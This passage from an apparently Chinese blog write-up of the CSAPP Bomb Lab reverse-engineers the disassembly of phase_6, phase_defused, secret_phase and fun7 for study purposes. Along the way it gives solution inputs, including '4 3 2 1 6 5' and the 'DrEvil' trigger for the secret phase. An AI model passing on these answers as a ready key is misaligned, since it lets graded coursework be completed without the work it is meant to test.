class="number">0x5f</span>&gt;</div><div class="line">  <span class="number">401132</span>:       <span class="number">44</span> <span class="number">89</span> e3                <span class="keyword">mov</span>    %r12d,%ebx</div><div class="line">  <span class="number">401135</span>:       <span class="number">48</span> <span class="number">63</span> c3                movslq %ebx,%rax</div><div class="line">  <span class="number">401138</span>:       8b <span class="number">04</span> <span class="number">84</span>                <span class="keyword">mov</span>    (%rsp,%rax,<span class="number">4</span>),%eax</div><div class="line">  40113b:       <span class="number">39</span> <span class="number">45</span> <span class="number">00</span>                <span class="keyword">cmp</span>    %eax,<span class="number">0x0</span>(%rbp)</div><div class="line">  40113e:       <span class="number">75</span> <span class="number">05</span>                   <span class="keyword">jne</span>    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</div><div class="line">  <span class="number">401140</span>:       e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  <span class="number">401145</span>:       <span class="number">83</span> c3 <span class="number">01</span>                <span class="keyword">add</span>    <span class="number">$0</span>x1,%ebx</div><div class="line">  <span class="number">401148</span>:       <span class="number">83</span> fb <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%ebx</div><div class="line">  40114b:       7e e8                   <span class="keyword">jle</span>    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</div><div class="line">  <span class="number">40114d</span>:       <span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%r13</div><div class="line">  <span class="number">401151</span>:       eb c1                   <span class="keyword">jmp</span>    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</div><div class="line">  # 判断这<span class="number">6</span>个数字两两不重复</div><div class="line">  <span class="number">401153</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rsi</div><div class="line">  <span class="number">401158</span>:       4c <span class="number">89</span> f0                <span class="keyword">mov</span>    %r14,%rax</div><div class="line">  40115b:       b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x7,%ecx</div><div class="line">  <span class="number">401160</span>:       <span class="number">89</span> ca                   <span class="keyword">mov</span>    %ecx,%edx</div><div class="line">  <span class="number">401162</span>:       2b <span class="number">10</span>                   <span class="keyword">sub</span>    (%rax),%edx</div><div class="line">  <span class="number">401164</span>:       <span class="number">89</span> <span class="number">10</span>                   <span class="keyword">mov</span>    %edx,(%rax)</div><div class="line">  <span class="number">401166</span>:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rax</div><div class="line">  40116a:       <span class="number">48</span> <span class="number">39</span> f0                <span class="keyword">cmp</span>    %rsi,%rax</div><div class="line">  <span class="number">40116d</span>:       <span class="number">75</span> f1                   <span class="keyword">jne</span>    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</div><div class="line">  # 分别用<span class="number">7</span>减去这<span class="number">6</span>个数</div><div class="line">  40116f:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</div><div class="line">  <span class="number">401174</span>:       eb <span class="number">21</span>                   <span class="keyword">jmp</span>    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</div><div class="line">  <span class="number">401176</span>:       <span class="number">48</span> 8b <span class="number">52</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdx),%rdx</div><div class="line">  40117a:       <span class="number">83</span> c0 <span class="number">01</span>                <span class="keyword">add</span>    <span class="number">$0</span>x1,%eax</div><div class="line">  <span class="number">40117d</span>:       <span class="number">39</span> c8                   <span class="keyword">cmp</span>    %ecx,%eax</div><div class="line">  40117f:       <span class="number">75</span> f5                   <span class="keyword">jne</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</div><div class="line">  <span class="number">401181</span>:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</div><div class="line">  <span class="number">401183</span>:       ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</div><div class="line">  <span class="number">401188</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>          <span class="keyword">mov</span>    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</div><div class="line">  <span class="number">40118d</span>:       <span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rsi</div><div class="line">  <span class="number">401191</span>:       <span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x18,%rsi</div><div class="line">  <span class="number">401195</span>:       <span class="number">74</span> <span class="number">14</span>                   <span class="keyword">je</span>     4011ab &lt;phase_6+<span class="number">0xb7</span>&gt;</div><div class="line">  <span class="number">401197</span>:       8b 0c <span class="number">34</span>                <span class="keyword">mov</span>    (%rsp,%rsi,<span class="number">1</span>),%ecx</div><div class="line">  40119a:       <span class="number">83</span> f9 <span class="number">01</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%ecx</div><div class="line">  <span class="number">40119d</span>:       7e e4                   <span class="keyword">jle</span>    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</div><div class="line">  40119f:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</div><div class="line">  4011a4:       ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</div><div class="line">  4011a9:       eb cb                   <span class="keyword">jmp</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</div><div class="line">  4011ab:       <span class="number">48</span> 8b 5c <span class="number">24</span> <span class="number">20</span>          <span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx</div><div class="line">  4011b0:       <span class="number">48</span> <span class="number">8d</span> <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>          <span class="keyword">lea</span>    <span class="number">0x28</span>(%rsp),%rax</div><div class="line">  4011b5:       <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>          <span class="keyword">lea</span>    <span class="number">0x50</span>(%rsp),%rsi</div><div class="line">  4011ba:       <span class="number">48</span> <span class="number">89</span> d9                <span class="keyword">mov</span>    %rbx,%rcx</div><div class="line">  4011bd:       <span class="number">48</span> 8b <span class="number">10</span>                <span class="keyword">mov</span>    (%rax),%rdx</div><div class="line">  4011c0:       <span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>             <span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)</div><div class="line">  4011c4:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rax</div><div class="line">  4011c8:       <span class="number">48</span> <span class="number">39</span> f0                <span class="keyword">cmp</span>    %rsi,%rax</div><div class="line">  4011cb:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     4011d2 &lt;phase_6+<span class="number">0xde</span>&gt;</div><div class="line">  4011cd:       <span class="number">48</span> <span class="number">89</span> d1                <span class="keyword">mov</span>    %rdx,%rcx</div><div class="line">  4011d0:       eb eb                   <span class="keyword">jmp</span>    4011bd &lt;phase_6+<span class="number">0xc9</span>&gt;</div><div class="line">  4011d2:       <span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">movq</span>   <span class="number">$0</span>x0,<span class="number">0x8</span>(%rdx)</div><div class="line">  4011d9:       <span class="number">00</span></div><div class="line">  4011da:       bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x5,%ebp</div><div class="line">  4011df:       <span class="number">48</span> 8b <span class="number">43</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax</div><div class="line">  4011e3:       8b <span class="number">00</span>                   <span class="keyword">mov</span>    (%rax),%eax</div><div class="line">  4011e5:       <span class="number">39</span> <span class="number">03</span>                   <span class="keyword">cmp</span>    %eax,(%rbx)</div><div class="line">  4011e7:       <span class="number">7d</span> <span class="number">05</span>                   <span class="keyword">jge</span>    4011ee &lt;phase_6+<span class="number">0xfa</span>&gt;</div><div class="line">  4011e9:       e8 4c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</div><div class="line">  4011ee:       <span class="number">48</span> 8b 5b <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx</div><div class="line">  4011f2:       <span class="number">83</span> ed <span class="number">01</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x1,%ebp</div><div class="line">  4011f5:       <span class="number">75</span> e8                   <span class="keyword">jne</span>    4011df &lt;phase_6+<span class="number">0xeb</span>&gt;</div><div class="line">  # 主要是重排链表 并且判断重排后的链表递减 否则引爆bomb</div><div class="line">  4011f7:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>             <span class="keyword">add</span>    <span class="number">$0</span>x50,%rsp</div><div class="line">  4011fb:       5b                      <span class="keyword">pop</span>    %rbx</div><div class="line">  4011fc:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %rbp</div><div class="line">  4011fd:       <span class="number">41</span> 5c                   <span class="keyword">pop</span>    %r12</div><div class="line">  4011ff:       <span class="number">41</span> <span class="number">5d</span>                   <span class="keyword">pop</span>    %r13</div><div class="line">  <span class="number">401201</span>:       <span class="number">41</span> 5e                   <span class="keyword">pop</span>    %r14</div><div class="line">  <span class="number">401203</span>:       c3                      retq   </div></pre></td></tr></table></figure><br>由于phase_6的逆向比较复杂，这里只大致介绍该函数的作用——</p>
<ol>
<li>该函数在栈上分配了80个字节，包括了一个有6个int型数字的数组a和一个有6个指针的数组b。</li>
<li>同phase_2一样，该函数调用了read_six_numbers从输入的字符串中读取了6个数字，并且保存到数组a中。</li>
<li>判断这6个数字是否都小于等于6并且互相不重复，如果不满足则引爆炸弹。</li>
<li>分别用7减去这6个数，并且用计算结果覆盖这6个数。既a[i] = 7 - a[i]。</li>
<li>phase_6中引用了来自0x6032d0的结构体数组，该结构体共16个字节，其中前8个字节存放了一个int型的数字（结构体对齐），后8个字节存放了一个指针，该指针在指向结构体数组中的下一个元素。这实际上是一个有6个元素的单向链表。</li>
<li>程序从i=1开始，将结构体数组中的第a[i]个元素的首地址存放进b[i]中，循环6次，直到i=6。</li>
<li>程序从b[1]开始，将b[1]对应的元素的后8个字节对应的地址指向b[2]，直到b[5]-&gt;next = b[6]，将b[6]所对应的元素的后8个字节对应的地址指向0。</li>
<li>然后从b[1]所对应的节点开始，依次判断整个链表是否降序排列，如果不满足降序，则引爆bomb。</li>
</ol>
<p>phase_6是所有phases中最难的一个，其本质是输入1组数字从而实现对单向链表的重排，使得重排后的单向链表降序。</p>
<p>原链表的情况如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">节点</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">值</td>
<td style="text-align:center">322</td>
<td style="text-align:center">168</td>
<td style="text-align:center">924</td>
<td style="text-align:center">691</td>
<td style="text-align:center">477</td>
<td style="text-align:center">443</td>
</tr>
</tbody>
</table>
<p>因此使得链表降序的输入为：”3 4 5 6 1 2”<br>注意这是用7减过之后的数字序列，原输入序列也就是答案应为：”4 3 2 1 6 5”</p>
<h4 id="隐藏阶段-secret-phase"><a href="#隐藏阶段-secret-phase" class="headerlink" title="隐藏阶段 - secret_phase"></a>隐藏阶段 - secret_phase</h4><p>观察bomb-symboltable和bomb-disassemble我们都能发现一个叫做secret_phase的函数，这就是本次实验中被隐藏起来的phase。</p>
<p>经过观察反汇编代码，我们发现call secret_phase位于phase_defused函数中。</p>
<p>在bomb-disassemble中观察phase_defused的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">00000000004015c4 &lt;phase_defused&gt;:</div><div class="line">  4015c4:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">78</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x78,%rsp</div><div class="line">  4015c8:       <span class="number">64</span> <span class="number">48</span> 8b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">  4015cf:       <span class="number">00</span> <span class="number">00</span></div><div class="line">  4015d1:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x68</span>(%rsp)</div><div class="line">  4015d6:       <span class="number">31</span> c0                   <span class="keyword">xor</span>    %eax,%eax</div><div class="line">  4015d8:       <span class="number">83</span> <span class="number">3d</span> <span class="number">81</span> <span class="number">21</span> <span class="number">20</span> <span class="number">00</span> <span class="number">06</span>    cmpl   <span class="number">$0</span>x6,<span class="number">0x202181</span>(%rip)        # <span class="number">603760</span> &lt;num_input_strings&gt;</div><div class="line">  # 输入过的字符串数目必须为<span class="number">6</span> 意味着必须是phase_6之后</div><div class="line">  4015df:       <span class="number">75</span> 5e                   <span class="keyword">jne</span>    40163f &lt;phase_defused+<span class="number">0x7b</span>&gt;</div><div class="line">  4015e1:       4c <span class="number">8d</span> <span class="number">44</span> <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%r8</div><div class="line">  4015e6:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</div><div class="line">  4015eb:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</div><div class="line">  4015f0:       be <span class="number">19</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402619,%esi</div><div class="line">  4015f5:       bf <span class="number">70</span> <span class="number">38</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x603870,%edi</div><div class="line">  4015fa:       e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</div><div class="line">  4015ff:       <span class="number">83</span> f8 <span class="number">03</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x3,%eax</div><div class="line">  <span class="number">401602</span>:       <span class="number">75</span> <span class="number">31</span>                   <span class="keyword">jne</span>    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</div><div class="line">  <span class="number">401604</span>:       be <span class="number">22</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402622,%esi</div><div class="line">  <span class="number">401609</span>:       <span class="number">48</span> <span class="number">8d</span> 7c <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</div><div class="line">  40160e:       e8 <span class="number">25</span> fd ff ff          callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</div><div class="line">  # 第<span class="number">4</span>个输入字符串读入两个数字和一个字符串 且字符串必须与<span class="number">0x402622</span>处的字符串相等</div><div class="line">  <span class="number">401613</span>:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</div><div class="line">  <span class="number">401615</span>:       <span class="number">75</span> 1e                   <span class="keyword">jne</span>    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</div><div class="line">  <span class="number">401617</span>:       bf f8 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4024f8,%edi</div><div class="line">  40161c:       e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  <span class="number">401621</span>:       bf <span class="number">20</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402520,%edi</div><div class="line">  <span class="number">401626</span>:       e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  40162b:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  <span class="number">401630</span>:       e8 <span class="number">0d</span> fc ff ff          callq  <span class="number">401242</span> &lt;secret_phase&gt;</div><div class="line">  # 然后才能进入隐藏阶段</div><div class="line">  <span class="number">401635</span>:       bf <span class="number">58</span> <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402558,%edi</div><div class="line">  40163a:       e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  40163f:       <span class="number">48</span> 8b <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>          <span class="keyword">mov</span>    <span class="number">0x68</span>(%rsp),%rax</div><div class="line">  <span class="number">401644</span>:       <span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</div><div class="line">  40164b:       <span class="number">00</span> <span class="number">00</span></div><div class="line">  <span class="number">40164d</span>:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">401654</span> &lt;phase_defused+<span class="number">0x90</span>&gt;</div><div class="line">  40164f:       e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</div><div class="line">  <span class="number">401654</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">78</span>             <span class="keyword">add</span>    <span class="number">$0</span>x78,%rsp</div><div class="line">  <span class="number">401658</span>:       c3                      retq   </div></pre></td></tr></table></figure><br>当且仅当phase_6解除并且从phase_4的输入字符串依次读取两个数字和一个字符串且这个字符串为”DrEvil”时，可以进入。</p>
<p>在bomb-disassemble中观察secret_phase的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000401242</span> &lt;secret_phase&gt;:</div><div class="line">  <span class="number">401242</span>:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</div><div class="line">  <span class="number">401243</span>:       e8 <span class="number">56</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  <span class="number">401248</span>:       ba 0a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xa,%edx</div><div class="line">  <span class="number">40124d</span>:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</div><div class="line">  <span class="number">401252</span>:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  <span class="number">401255</span>:       e8 <span class="number">76</span> f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</div><div class="line">  # 调用strtol函数</div><div class="line">  40125a:       <span class="number">48</span> <span class="number">89</span> c3                <span class="keyword">mov</span>    %rax,%rbx</div><div class="line">  <span class="number">40125d</span>:       <span class="number">8d</span> <span class="number">40</span> ff                <span class="keyword">lea</span>    -<span class="number">0x1</span>(%rax),%eax</div><div class="line">  <span class="number">401260</span>:       <span class="number">3d</span> e8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">cmp</span>    <span class="number">$0</span>x3e8,%eax</div><div class="line">  <span class="number">401265</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    40126c &lt;secret_phase+<span class="number">0x2a</span>&gt;</div><div class="line">  <span class="number">401267</span>:       e8 ce <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 如果数字减<span class="number">1</span>之后大于<span class="number">1000</span> 则引爆bomb</div><div class="line">  40126c:       <span class="number">89</span> de                   <span class="keyword">mov</span>    %ebx,%esi</div><div class="line">  40126e:       bf f0 <span class="number">30</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6030f0,%edi</div><div class="line">  <span class="number">401273</span>:       e8 8c ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</div><div class="line">  # 调用fun7</div><div class="line">  <span class="number">401278</span>:       <span class="number">83</span> f8 <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</div><div class="line">  40127b:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">401282</span> &lt;secret_phase+<span class="number">0x40</span>&gt;</div><div class="line">  <span class="number">40127d</span>:       e8 b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 如果fun7返回值不为<span class="number">2</span> 则引爆bomb</div><div class="line">  <span class="number">401282</span>:       bf <span class="number">38</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402438,%edi</div><div class="line">  <span class="number">401287</span>:       e8 <span class="number">84</span> f8 ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  40128c:       e8 <span class="number">33</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  <span class="number">401291</span>:       5b                      <span class="keyword">pop</span>    %rbx</div><div class="line">  <span class="number">401292</span>:       c3                      retq   </div></pre></td></tr></table></figure><br>根据反汇编的结果，我们可以得知，secret_phase同样需要读入一个字符串，之后其首先调用strtol(input, NULL, 10)将输入的字符串转换成long型数字a。</p>
<p>如果该数字&gt;1001，则引爆bomb，否则则调用fun7(0x6030f0, a)并判断其返回结果，当且仅当结果为2时，解除secret_phase。</p>
<p>在bomb-disassemble中观察fun7的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="number">0000000000401204</span> &lt;fun7&gt;:</div><div class="line">  <span class="number">401204</span>:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  <span class="number">401208</span>:       <span class="number">48</span> <span class="number">85</span> ff                <span class="keyword">test</span>   %rdi,%rdi</div><div class="line">  40120b:       <span class="number">74</span> 2b                   <span class="keyword">je</span>     <span class="number">401238</span> &lt;fun7+<span class="number">0x34</span>&gt;</div><div class="line">  <span class="number">40120d</span>:       8b <span class="number">17</span>                   <span class="keyword">mov</span>    (%rdi),%edx</div><div class="line">  40120f:       <span class="number">39</span> f2                   <span class="keyword">cmp</span>    %esi,%edx</div><div class="line">  <span class="number">401211</span>:       7e <span class="number">0d</span>                   <span class="keyword">jle</span>    <span class="number">401220</span> &lt;fun7+<span class="number">0x1c</span>&gt;</div><div class="line">  <span class="number">401213</span>:       <span class="number">48</span> 8b 7f <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdi),%rdi</div><div class="line">  <span class="number">401217</span>:       e8 e8 ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</div><div class="line">  40121c:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</div><div class="line">  40121e:       eb <span class="number">1d</span>                   <span class="keyword">jmp</span>    <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</div><div class="line">  <span class="number">401220</span>:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  <span class="number">401225</span>:       <span class="number">39</span> f2                   <span class="keyword">cmp</span>    %esi,%edx</div><div class="line">  <span class="number">401227</span>:       <span class="number">74</span> <span class="number">14</span>                   <span class="keyword">je</span>     <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</div><div class="line">  <span class="number">401229</span>:       <span class="number">48</span> 8b 7f <span class="number">10</span>             <span class="keyword">mov</span>    <span class="number">0x10</span>(%rdi),%rdi</div><div class="line">  <span class="number">40122d</span>:       e8 d2 ff ff ff          callq  <span class="number">401204</span> &lt;fun7&gt;</div><div class="line">  <span class="number">401232</span>:       <span class="number">8d</span> <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>             <span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</div><div class="line">  <span class="number">401236</span>:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    <span class="number">40123d</span> &lt;fun7+<span class="number">0x39</span>&gt;</div><div class="line">  <span class="number">401238</span>:       b8 ff ff ff ff          <span class="keyword">mov</span>    <span class="number">$0</span>xffffffff,%eax</div><div class="line">  <span class="number">40123d</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</div><div class="line">  <span class="number">401241</span>:       c3                      retq   </div><div class="line">  # 同样是递归的二分查找过程 数据结构是BST二叉搜索树</div></pre></td></tr></table></figure><br>将fun7逆向，结果如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tree</span> &#123;</span></div><div class="line">	<span class="keyword">int</span> val;</div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">left</span>;</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">right</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(struct tree * ptr, <span class="keyword">int</span> num)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	<span class="keyword">if</span> (ptr-&gt;val == num) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (ptr-&gt;val &lt; num) &#123;</div><div class="line">		ptr = ptr-&gt;right;</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span> * fun7(ptr, num) + <span class="number">1</span>;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		ptr = ptr-&gt;left;</div><div class="line">		<span class="keyword">return</span> <span class="number">2</span> * fun7(ptr, num);</div><div class="line">	&#125;</div><div class="line">&#125;		 </div></pre></td></tr></table></figure><br>其中，ptr所指向的struct tree是一棵二叉搜索树的根节点。对于二叉搜索树的任意一个节点，节点左边孩子的值全部小于该节点的值，节点右边孩子的值全部大于该节点的值。</p>
<p>这棵根节点位于0x6030f0的二叉搜索树的结构如下图所示：<br><img src="/2017/04/18/深入理解计算机系统BombLab实验报告/BST.png" alt="BST.png" title=""></p>
